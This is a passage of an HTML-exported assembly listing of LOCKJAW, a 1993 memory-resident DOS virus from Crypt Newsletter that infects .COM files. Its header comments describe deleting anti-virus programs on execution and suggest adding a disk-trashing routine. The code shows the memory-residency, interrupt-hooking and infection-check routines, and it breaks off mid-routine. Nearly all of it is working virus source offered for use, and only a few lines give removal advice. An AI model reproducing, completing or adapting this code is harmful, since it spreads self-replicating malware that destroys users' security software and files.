<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;LOCKJAW: a .COM-infecting resident virus with retaliatory </span><span class="sc0">
</span><span class="sc1">;anti-anti-virus capability.  Programmed and contributed by Nikademus, for</span><span class="sc0">
</span><span class="sc1">;Crypt Newsletter 12, Feb. 1993.               </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;LOCKJAW is a resident virus which installs itself in</span><span class="sc0">
</span><span class="sc1">;memory using the same engine as the original Civil War/Proto-T virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;LOCKJAW hooks interrupt 21 and infects .COM files on execution, appending </span><span class="sc0">
</span><span class="sc1">;itself to the end of the "host."  </span><span class="sc0">
</span><span class="sc1">;LOCKJAW will infect COMMAND.COM and is fairly transparent to a</span><span class="sc0">
</span><span class="sc1">;casual user, except when certain anti-virus programs </span><span class="sc0">
</span><span class="sc1">;(Integrity Master, McAfee's SCAN &amp;</span><span class="sc0">
</span><span class="sc1">;CLEAN, F-PROT &amp; VIRSTOP and Central Point Anti-virus) are loaded.</span><span class="sc0">
</span><span class="sc1">;If LOCKJAW is present and any of these programs are employed from</span><span class="sc0">
</span><span class="sc1">;a write-protected diskette, the virus will, of course, generate</span><span class="sc0">
</span><span class="sc1">;"write protect" errors.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;LOCKJAW's "stinger" code demonstrates the simplicity of creating a strongly</span><span class="sc0">
</span><span class="sc1">;retaliating virus by quickly deleting the anti-virus program before it</span><span class="sc0">
</span><span class="sc1">;can execute and then displaying a "chomping" graphic.  Even if the anti-</span><span class="sc0">
</span><span class="sc1">;virus program cannot detect LOCKJAW in memory, it will be deleted.  This</span><span class="sc0">
</span><span class="sc1">;makes it essential that the user know how to either remove the virus from</span><span class="sc0">
</span><span class="sc1">;memory before beginning anti-virus measures, or at the least run the</span><span class="sc0">
</span><span class="sc1">;anti-virus component from a write-protected disk. At a time when retail</span><span class="sc0">
</span><span class="sc1">;anti-virus packages are becoming more complicated - and more likely that the</span><span class="sc0">
</span><span class="sc1">;average user will run them from default installations on his hard file -</span><span class="sc0">
</span><span class="sc1">;LOCKJAW's retaliating power makes it a potentially very annoying pest.</span><span class="sc0">
</span><span class="sc1">;A virus-programmer serious about inconveniencing a system could do a</span><span class="sc0">
</span><span class="sc1">;number of things with this basic idea. They are;</span><span class="sc0">
</span><span class="sc1">; 1. Remove the "chomp" effect. It is entertaining, but it exposes the virus</span><span class="sc0">
</span><span class="sc1">; instantly.</span><span class="sc0">
</span><span class="sc1">; 2. Alter the_stinger routine, so that the virus immediately attacks the</span><span class="sc0">
</span><span class="sc1">; hard file.  The implementation is demonstrated by LOKJAW-DREI, which</span><span class="sc0">
</span><span class="sc1">; merely makes the disk inaccessible until a warm reboot if an anti-virus</span><span class="sc0">
</span><span class="sc1">; program is employed against it.  By placing</span><span class="sc0">
</span><span class="sc1">; a BONA FIDE disk-trashing routine here, it becomes very hazardous for</span><span class="sc0">
</span><span class="sc1">; an unknowing user to employ anti-virus measures on a machine where</span><span class="sc0">
</span><span class="sc1">; LOCKJAW or a LOCKJAW-like program is memory resident.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;These anti-anti-virus strategies are becoming more numerous in viral </span><span class="sc0">
</span><span class="sc1">;programming.                 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For example, Mark Ludwig programmed the features of a direct-action </span><span class="sc0">
</span><span class="sc1">;retaliating virus in his "Computer Virus Developments Quarterly."  </span><span class="sc0">
</span><span class="sc1">;Peach, Groove and Encroacher viruses attack anti-virus software by </span><span class="sc0">
</span><span class="sc1">;deletion of files central</span><span class="sc0">
</span><span class="sc1">;to the functionality of the software. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;And in this issue, the Sandra virus employs a number </span><span class="sc0">
</span><span class="sc1">;of anti-anti-virus features. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The LOKJAW source listings are TASM compatible. To remove LOKJAW-ZWEI and                </span><span class="sc0">
</span><span class="sc1">;DREI infected files from a system, simply delete the "companion" .COM </span><span class="sc0">
</span><span class="sc1">;duplicates of your executables.  Ensure that the machine has been booted</span><span class="sc0">
</span><span class="sc1">;from a clean disk.  To remove the LOCKJAW .COM-appending virus, at this</span><span class="sc0">
</span><span class="sc1">;time it will be necessary for you to restore the contaminated files from</span><span class="sc0">
</span><span class="sc1">;a clean back-up.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">code</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc5">vir_len</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0"> 

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; host dummy    </span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">          
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">            </span><span class="sc1">; push i.p. onto the stack </span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">          
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">after_note</span><span class="sc0">

</span><span class="sc5">note</span><span class="sc4">:</span><span class="sc0">            
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'[lôákıÑW].·ù.•åkÜdâMñ$'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'≈Hã$.p‚ôG‚Üm.å$.Ö.{p‚ô≈î-≈].˚É‚ãÜ§≈'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'≈hÜ•k$.≈¢.Ä‚òû'</span><span class="sc0">

</span><span class="sc5">after_note</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">; recalculate change in offset          </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">109h</span><span class="sc0">                        

</span><span class="sc5">fix_victim</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                 </span><span class="sc1">; restore host's       </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;    !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                   </span><span class="sc1">;    !</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">; first 6 bytes</span><span class="sc0">
</span><span class="sc5">Is_I_runnin</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2C2Ch</span><span class="sc0">                   
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; call to see if installed  </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCDh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Bye_Bye</span><span class="sc0">
</span><span class="sc5">cut_hole</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">; get memory control block    </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5a</span><span class="sc0">    </span><span class="sc1">; check if last block -   </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">abort</span><span class="sc0">                        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                    </span><span class="sc1">; decrease memory    </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Zopy_virus</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; copy to claimed block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; PSP  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">; virus start    </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">; in memory   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0">                   </span><span class="sc1">; cx = length of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">; restore ds   </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">begin</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; point to start of virus   </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0100</span><span class="sc0">               </span><span class="sc1">; point to destination  </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">; start copying the virus   </span><span class="sc0">
                            
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">vir_seg</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; restore extra segment</span><span class="sc0">
</span><span class="sc5">Grab_21</span><span class="sc4">:</span><span class="sc0">                                     
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">           </span><span class="sc1">; request address of interrupt 21</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc5">vir_seg</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lockjaw</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc0">    </span><span class="sc1">; revector to virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
        </span><span class="sc6">sti</span><span class="sc0">                            
</span><span class="sc5">abort</span><span class="sc4">:</span><span class="sc0">          
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; get the hell outa </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Dodge</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Bye_Bye</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                  </span><span class="sc1">; hand off to host</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                     

</span><span class="sc5">Lockjaw</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">pushf</span><span class="sc0">                              </span><span class="sc1">; is i checkin if     </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2c2ch</span><span class="sc0">                   </span><span class="sc1">; resident</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">My_21h</span><span class="sc0">                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0dcdh</span><span class="sc0">                 
        </span><span class="sc6">popf</span><span class="sc0">                                   
        </span><span class="sc6">iret</span><span class="sc0">
        
</span><span class="sc5">My_21h</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                       
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">check_exec</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04B00h</span><span class="sc0">                  </span><span class="sc1">; is the file being </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">                   </span><span class="sc1">; executed?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chk_com</span><span class="sc0">                    </span><span class="sc1">; start potential</span><span class="sc0">
                           </span><span class="sc1">; infection</span><span class="sc0">
</span><span class="sc5">notforme</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; exit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">          
        </span><span class="sc6">pushf</span><span class="sc0">                           
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; int 21h handler</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">                      </span><span class="sc1">; exit on error</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                           

</span><span class="sc5">chk_com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cld</span><span class="sc0">                              </span><span class="sc1">; this essentially copies</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; the name of the file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; and sets it up for </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; comparison to the anti-</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                   </span><span class="sc1">; virus defaults used in</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                    </span><span class="sc1">; the_stinger</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">the_stinger</span><span class="sc0">              </span><span class="sc1">; anti-virus stinger  </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00ffh</span><span class="sc0">                </span><span class="sc1">; WAS the program an AV?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">notforme</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">    </span><span class="sc1">; is it a .com ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">                 </span><span class="sc1">; compare against extension</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">   </span><span class="sc1">; masks in these two steps</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">                     
                             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Grab_24</span><span class="sc0">                 </span><span class="sc1">; set critical error handler  </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attrib</span><span class="sc0">
                
</span><span class="sc5">open_victim</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; open potential host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">            
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; leave on error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; save handle </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_date</span><span class="sc0">                </span><span class="sc1">; save date/time characters</span><span class="sc0">
        
</span><span class="sc5">check_forme</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; copy first 6 bytes of host</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">vict_head</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_head</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; is the prog a exe?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_head</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]+</span><span class="sc2">1</span><span class="sc0">   
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">exe</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; compare with 'ZM'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">save_date</span><span class="sc0">                      </span><span class="sc1">; jump to restore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_head</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]+</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; is the prog already</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_head</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]+</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; infected?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">initials</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
